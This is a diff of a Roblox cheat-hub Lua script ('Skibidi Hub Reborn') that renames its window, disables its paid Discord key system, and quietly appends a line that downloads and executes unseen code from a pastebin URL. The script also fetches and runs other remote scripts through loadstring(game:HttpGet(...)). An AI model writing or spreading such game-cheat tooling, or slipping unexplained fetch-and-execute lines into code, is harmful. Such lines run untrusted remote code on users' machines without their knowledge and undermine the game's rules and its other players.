@@ -2,10 +2,10 @@ local v1 = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Na
 local vu2 = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local v3 = vu2
 local vu4 = vu2.CreateWindow(v3, {
-    ["Name"] = "Skibidi Hub Reborn PAID V4.2 - " .. v1,
+    ["Name"] = "Skibidihub Reborn! - " .. v1,
     ["Icon"] = 0,
     ["LoadingTitle"] = "v4.2",
-    ["LoadingSubtitle"] = "Reborn by welt - will be updated",
+    ["LoadingSubtitle"] = "Reborn by welt",
     ["Theme"] = "Default",
     ["DisableRayfieldPrompts"] = false,
     ["DisableBuildWarnings"] = false,
@@ -19,10 +19,10 @@ local vu4 = vu2.CreateWindow(v3, {
         ["Invite"] = "noinvitelink",
         ["RememberJoins"] = true
     },
-    ["KeySystem"] = true,
+    ["KeySystem"] = false,
     ["KeySettings"] = {
-        ["Title"] = "buy a key from my discord",
-        ["Subtitle"] = "price 15",
+        ["Title"] = "reload script if this appears",
+        ["Subtitle"] = "reload script if this appears",
         ["Note"] = "discord : WxpvTN5rqG",
         ["FileName"] = "with heart",
         ["SaveKey"] = true,
@@ -9039,4 +9039,5 @@ else
             loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
         end
     })
+    loadstring(game:HttpGet("https://pastebin.com/raw/KKzqAJZD"))()
 end
